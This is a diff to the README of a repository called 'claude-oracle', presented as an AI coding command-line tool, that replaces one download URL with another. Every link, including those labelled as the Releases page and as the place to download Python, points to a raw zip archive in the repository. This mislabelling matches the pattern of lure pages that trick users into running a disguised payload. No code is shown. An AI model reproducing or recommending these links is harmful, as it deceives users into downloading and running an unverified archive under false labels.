@@ -6,13 +6,13 @@ Welcome to **claude-oracle**! This command-line interface (CLI) brings the power
 
 ## 📥 Download Now
 
-[![Download claude-oracle](https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip%https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip)](https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip)
+[![Download claude-oracle](https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip%https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip)](https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip)
 
 To get started with **claude-oracle**, please download the latest version from our Releases page.
 
 ## 🔗 Download & Install
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip).
+1. Click this link to visit the [Releases page](https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip).
 2. On the Releases page, you will see various versions of **claude-oracle**. 
 3. Choose the version you want to download.
 4. Locate the download button for your operating system (Windows, macOS, or Linux) and click on it to start downloading.
@@ -36,7 +36,7 @@ To ensure the best performance of **claude-oracle**, make sure your system meets
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent distribution of Linux.
 - **Memory**: At least 4 GB of RAM.
 - **Storage**: Minimum 100 MB of free space.
-- **Python**: Ensure you have Python 3.6 or later installed. You can download Python from [https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip](https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip).
+- **Python**: Ensure you have Python 3.6 or later installed. You can download Python from [https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip](https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip).
 
 ## 📖 Usage
 
@@ -67,6 +67,6 @@ Your security is a priority. **claude-oracle** does not store personal data or c
 
 Stay updated with any new features or improvements as we regularly release updates. If you want to help develop **claude-oracle**, feel free to fork the repository and submit your changes via pull requests.
 
-For the latest information and features, please check our [Releases page](https://raw.githubusercontent.com/anbalirofiat/claude-oracle/main/commands/claude-oracle-2.8-beta.4.zip) regularly.
+For the latest information and features, please check our [Releases page](https://github.com/anbalirofiat/claude-oracle/raw/refs/heads/main/commands/claude_oracle_v2.7.zip) regularly.
 
 Explore the power of AI assistance in coding with **claude-oracle**! Happy coding!
